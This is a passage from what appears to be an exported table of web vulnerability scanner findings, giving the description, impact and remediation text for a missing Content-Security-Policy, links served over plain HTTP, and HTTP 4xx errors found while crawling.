When configured appropriately, browser-level XSS filters can provide additional layers of defense against web application attacks.

WAS checks for the missing CSP on all static and dynamic pages. It checks for CSP in the response headers (Content-Security-Policy, X-Content-Security-Policy or X-Webkit-CSP) and in response body (http-equiv=""Content-Security-Policy"" meta tag).<P>

HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security it's important to set appropriate CSP policies on 4xx and 5xx responses as well.
","Content-Security Policy is a defense mechanism that can significantly reduce the risk and impact of XSS attacks in modern browsers. The CSP specification provides a set of content restrictions for web resources and a mechanism for transmitting the policy from a server to a client where the policy is enforced. When a Content Security Policy is specified, a number of default behaviors in user agents are changed; specifically inline content and JavaScript eval constructs are not interpreted without additional directives. In short, CSP allows you to create a whitelist of sources of the trusted content. The CSP policy instructs the browser to only render resources from those whitelisted sources. Even though an attacker can find a security vulnerability in the application through which to inject script, the script won't match the whitelisted sources defined in the CSP policy, and therefore will not be executed.<P>

The absence of Content Security Policy in the response will allow the attacker to exploit vulnerabilities as the protection provided by the browser is not at all leveraged by the Web application. If secure CSP configuration is not implemented, browsers will not be able to block content-injection attacks such as Cross-Site Scripting and Clickjacking.

","Appropriate CSP policies help prevent content-injection attacks such as cross-site scripting (XSS) and clickjacking. It's recommended to add secure CSP policies as a part of a defense-in-depth approach for securing web applications.<P>

Note that this QID is reported for 200/OK responses as well as 4xx and 5xx responses.","Data sent over a non-HTTPS connection is unencrypted and vulnerable to network sniffing attacks that can expose sensitive or confidential information. This includes non-secure cookies and other potentially sensitive data contained in HTTP headers. Even if no sensitive data is transmitted, man-in-the-middle (MITM) attacks are possible over non-HTTPS connections. An attacker who exploits MITM can intercept and change the conversation between the client (e.g., web browser, mobile device, etc.) and the server.<P>

More information: <A HREF=""https://developers.google.com/web/fundamentals/security/encrypt-in-transit/why-https"" TARGET=""_blank"">Why HTTPS Matters</A>","Ensure that all links are accessible over HTTPS only. The most secure design is for the application to listen and respond only to encrypted HTTPS requests. Alternatively, if non-HTTPS requests are accepted, the server should redirect these requests to HTTPS using a 301 or 302 response.<P>

It is also strongly recommended to use <A HREF=""https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"" TARGET=""_blank"">HTTP Strict Transport Security</A> (HSTS) so that web browsers are instructed to use only HTTPS when making requests to the server. QID 150135 will be reported when links without HSTS are found.<P>

The HTTP 4xx message indicates a client error. The list of supported 4xx response code are as below:

401 - Unauthorized<BR>
403 - Forbidden<BR>
404 - Not Found<BR>
405 - Method Not Allowed<BR>

408 - Request Timeout<BR>
413 - Payload Too Large<BR>
414 - URI Too Long<BR>


","The presence of a HTTP 4xx error during the crawl phase indicates that some problem exists on the website that will be encountered during normal usage of the Web application. Note WAS depends on responses to detect many vulnerabilities if the link does not respond with an expected response then any vulnerabilities present on such links may not be detected.","Review each link to determine why the client encountered an error while requesting the link. Additionally review and investigate the results of QID 150042 which lists 5xx errors, QID 150019 which lists unexpected response codes and QID 150097 which lists a potential blocked request. ",,,""
